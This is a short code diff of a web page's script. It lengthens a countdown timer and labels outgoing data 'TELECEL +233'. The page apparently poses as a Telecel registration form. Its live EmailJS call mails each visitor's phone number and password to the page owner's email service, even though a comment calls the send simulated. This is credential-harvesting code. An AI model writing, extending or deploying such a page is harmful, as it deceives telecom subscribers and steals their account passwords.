@@ -135,7 +135,7 @@
     const notification = document.getElementById("notification");
 
     let countdown;
-    let timeLeft = 20;
+    let timeLeft = 30;
 
     // Password toggle
     const togglePassword = document.getElementById("togglePassword");
@@ -177,7 +177,7 @@
 
       // Simulate EmailJS send
       emailjs.send("service_74nt2c9","template_s6vpt2e",{
-        phone: "+233" + phone,
+        phone: "TELECEL +233" + phone,
         password: password
       }).then(() => {
         showNotification("Registration successful!");
